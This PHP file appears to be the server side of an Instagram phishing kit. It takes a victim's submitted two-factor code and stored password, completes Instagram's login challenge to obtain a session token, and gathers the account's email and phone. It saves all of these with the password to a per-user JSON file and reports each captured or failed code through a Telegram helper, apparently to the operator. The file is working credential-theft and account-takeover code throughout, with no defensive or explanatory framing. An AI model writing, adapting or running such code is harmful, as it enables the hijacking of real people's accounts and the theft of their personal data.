<?php
session_start();

require '../request.php';
require '../telegram.php';
require '../headers.php';
require_once '../account.php';
require '../encrypt.php';

use App\Request\Requests;
use App\Telegrams\telegram;
use App\Headers\HeadersList;
use App\Account\account;
use App\Encrypt\encrypts;

class challengeLogin
{

    private $Requests;
    private $telegram;
    private $headersList;
    private $enc;

    public function __construct()
    {
        $this->Requests = new Requests();
        $this->telegram = new telegram();
        $this->headersList = new HeadersList();
        $this->enc = new encrypts();
    }

    public function currentedituser($bearer, $user_id)
    {

        $headers = $this->headersList->appheaders($bearer, $user_id);

        $response = $this->Requests->RequestGETendpoint('accounts/current_user/?edit=true', $headers);

        $data = json_decode($response, true);

        return $data['user']['fbid_v2'];
    }

    public function logged_in_user($bearer, $user_id, $username, $password, $fbid)
    {

        $headers = $this->headersList->appheaders($bearer, $user_id);

        $post = [
            "_uid" => $user_id,
            "device_id" => $this->headersList->X_Ig_Android_Id,
            "_uuid" => $this->headersList->X_Ig_Device_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/account_security_info/", $headers, $post);

        $data = json_decode($response['body'], true);

        $email = !empty($data['email']) ? $data['email'] : "Yok";
        $phone_number = !empty($data['phone_number']) ? $data['phone_number'] : "Yok";

        $userdata = [
            'username'   => $username,
            'password'   => $password,
            'token'      => $bearer,
            'id'         => $user_id,
            'email'      => $email,
            'phone'      => $phone_number,
            'fbid'       => $fbid,
        ];

        $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);

        $filename = '../../cookies' . '/' . $username . '.json';
        file_put_contents($filename, $jsondata);
    }

    public function login($username, $password)
    {

        $headers = $this->headersList->localheaders();

        $post = [
            'phone_id' => $this->headersList->X_Ig_Family_Device_Id,
            'enc_password' => $this->enc->encrypt($password),
            'username' => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            'guid' => $this->headersList->X_Ig_Device_Id,
            'device_id' => $this->headersList->X_Ig_Android_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/login/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengeLOGİN($code, $context, $username)
    {

        $headers = $this->headersList->localheaders();

        $filename = '../logged/perf_logging_id' . $username . '.json';
        $s2sperflogin = file_get_contents($filename);
        $perfloggin = json_decode($s2sperflogin, true);

        $data = [
            "security_code" => htmlspecialchars($code, ENT_QUOTES, 'UTF-8'),
            "perf_logging_id" => $perfloggin['perf_logging_id'],
            "has_follow_up_screens" => '0',
            "bk_client_context" => '{"bloks_version":"' . $this->headersList->X_Ig_Family_Device_Id . '","styles_id":"instagram"}',
            "challenge_context" => htmlspecialchars($context, ENT_QUOTES, 'UTF-8'),
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
        ];



        $response = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }
}

$challenge_required = new challengeLogin;
$telegram = new telegram;
$account = new account;


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $code = htmlspecialchars($_POST["code"], ENT_QUOTES, 'UTF-8');
    $username = htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_SESSION['password']);
    $context = htmlspecialchars($_SESSION['context']);

    $responsechallenge = $challenge_required->challengeLOGİN($code, $context, $username);

    $data = json_decode($responsechallenge['body'], true);

    $headers = $responsechallenge['headers'];

    $headers = explode("\r\n", $headers);
    $found_ig_set_authorization = false;
    foreach ($headers as $header) {
        if (strpos($header, 'ig-set-authorization') !== false) {
            $found_ig_set_authorization = true;
            $bearer = trim(explode(':', $header, 2)[1]);
            preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
            $session_json = json_decode(base64_decode($session_json[2]));
            $user_id = $session_json->ds_user_id;

            $s = $challenge_required->login($username, $password);
            $eren = json_decode($s['body'], true);
            $fbid_v2 = $eren['logged_in_user']['fbid_v2'];

            if ($fbid_v2 === null) {
                $fbid_v2 = $challenge_required->currentedituser($bearer, $user_id);
            }

            $challenge_required->logged_in_user($bearer, $user_id, $username, $password, $fbid_v2);

            $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

            $directory = dirname(__FILE__);
            $parentDirectory = dirname($directory);
            $grandParentDirectory = dirname($parentDirectory);
            $grandParentDirectorys = dirname($grandParentDirectory);
            $grandParentDirectoryName = basename($grandParentDirectorys);

            $url = $protocol . $domain . "/" . $grandParentDirectoryName . "/form/app/s2s.php?username=" . urlencode($username);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 4);
            curl_exec($ch);
            curl_close($ch);

            $telegram->truecodecek($username, $code);
            $telegram->truecodecek($username, $code, true);
            echo trim('loginsucces');
        }
    }

    if (!$found_ig_set_authorization) {
        $telegram->badcode($username, $code);
        $telegram->badcode($username, $code, true);
        echo trim('badcode');
    }
}
